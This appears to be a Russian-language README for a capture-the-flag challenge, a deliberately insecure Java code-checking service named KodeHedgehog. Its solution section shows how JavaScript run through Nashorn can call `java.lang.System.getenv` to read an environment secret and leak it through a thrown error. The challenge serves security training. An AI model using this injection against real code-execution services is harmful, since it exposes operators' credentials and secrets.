# JS KodeHedgehog
## Legend
**RU**

Собрались как-то два программиста, и решили сделать обучающую платформу, которая бы могла проверять код и выдавать ведрикт проверки. 
Назвали они её ~~CodeHedgehog~~ KodeHedgehog. 

Всё хорошо, да только программисты не посещали пары по кибербезопасности.
Сможете ли вы взломать их?

## Description
Дано REST приложение, написанное на java.

Спецификацию API можно посмотреть по url: 
`http://localhost:8080/swagger`

Задача: получить флаг `FLAG`, который находится в переменных окружения.

## Install
Выполните команду `docker-compose up`

## Solution
Для выполнения скрипта на js используется библиотека [nashorn](https://www.baeldung.com/java-nashorn).
По умолчанию она позволяет обращаться к java объектам.
```js
var flag = java.lang.System.getenv("FLAG")
```
Чтобы вывести флаг, воспользуемся тем, что метод возвращает сообщение ошибки
```js
throw flag
```
Получаем ответ
```json
{
    "verdict": "ERROR",
    "testNumber": 1,
    "error": "{FLAG} in <eval> at line number 2 at column number 0"
}
```
